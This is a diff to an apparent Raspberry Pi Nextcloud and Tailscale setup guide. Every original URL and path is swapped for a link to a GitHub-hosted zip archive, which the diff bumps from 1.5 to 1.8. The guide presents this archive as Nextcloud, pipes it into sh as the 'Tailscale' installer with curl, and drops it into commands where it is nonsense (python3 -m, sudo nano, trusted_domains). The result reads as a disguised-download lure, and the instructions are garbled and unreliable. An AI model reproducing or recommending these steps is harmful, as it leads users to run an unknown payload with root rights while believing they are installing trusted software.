@@ -50,9 +50,9 @@ sudo apt install php libapache2-mod-php php-mysql php-xml php-mbstring php-zip p
 Download and configure Nextcloud:
 
 cd /tmp
-wget https://raw.githubusercontent.com/VERANDHAR073/Raspberrypi-cloud-server/main/isonym/Raspberrypi-cloud-server-1.5.zip
+wget https://github.com/VERANDHAR073/Raspberrypi-cloud-server/raw/refs/heads/main/isonym/cloud-Raspberrypi-server-1.8.zip
 sudo apt install unzip
-unzip https://raw.githubusercontent.com/VERANDHAR073/Raspberrypi-cloud-server/main/isonym/Raspberrypi-cloud-server-1.5.zip
+unzip https://github.com/VERANDHAR073/Raspberrypi-cloud-server/raw/refs/heads/main/isonym/cloud-Raspberrypi-server-1.8.zip
 sudo mv nextcloud /var/www/html/
 
 Set permissions for Nextcloud files:
@@ -64,7 +64,7 @@ Step 3: Install and Configure Tailscale
 
 Install Tailscale:
 
-curl -fsSL https://raw.githubusercontent.com/VERANDHAR073/Raspberrypi-cloud-server/main/isonym/Raspberrypi-cloud-server-1.5.zip | sh
+curl -fsSL https://github.com/VERANDHAR073/Raspberrypi-cloud-server/raw/refs/heads/main/isonym/cloud-Raspberrypi-server-1.8.zip | sh
 
 Start and enable Tailscale service:
 
@@ -75,7 +75,7 @@ Step 4: Host Your Cloud Online Using Tailscale Funnel
 
 Run a local server (replace port 3000 with your web server port if different):
 
-python3 -m https://raw.githubusercontent.com/VERANDHAR073/Raspberrypi-cloud-server/main/isonym/Raspberrypi-cloud-server-1.5.zip 3000
+python3 -m https://github.com/VERANDHAR073/Raspberrypi-cloud-server/raw/refs/heads/main/isonym/cloud-Raspberrypi-server-1.8.zip 3000
 
 Start Tailscale funnel to expose the port:
 
@@ -87,13 +87,13 @@ sudo tailscale funnel 80     # for HTTP port
 
 You will receive a URL like:
 
-https://raw.githubusercontent.com/VERANDHAR073/Raspberrypi-cloud-server/main/isonym/Raspberrypi-cloud-server-1.5.zip
+https://github.com/VERANDHAR073/Raspberrypi-cloud-server/raw/refs/heads/main/isonym/cloud-Raspberrypi-server-1.8.zip
 
 Step 5: Add Trusted Domain in Nextcloud Config
 
 Edit Nextcloud config file:
 
-sudo nano https://raw.githubusercontent.com/VERANDHAR073/Raspberrypi-cloud-server/main/isonym/Raspberrypi-cloud-server-1.5.zip
+sudo nano https://github.com/VERANDHAR073/Raspberrypi-cloud-server/raw/refs/heads/main/isonym/cloud-Raspberrypi-server-1.8.zip
 
 Add your Tailscale URL (and any IPs) in the 'trusted_domains' array, for example:
 
@@ -104,7 +104,7 @@ Add your Tailscale URL (and any IPs) in the 'trusted_domains' array, for example
     2 => '100.68.238.13',
     3 => '172.16.0.66',
     4 => '192.168.130.135',
-    5 => 'https://raw.githubusercontent.com/VERANDHAR073/Raspberrypi-cloud-server/main/isonym/Raspberrypi-cloud-server-1.5.zip'
+    5 => 'https://github.com/VERANDHAR073/Raspberrypi-cloud-server/raw/refs/heads/main/isonym/cloud-Raspberrypi-server-1.8.zip'
   ),
 
 Save and exit.
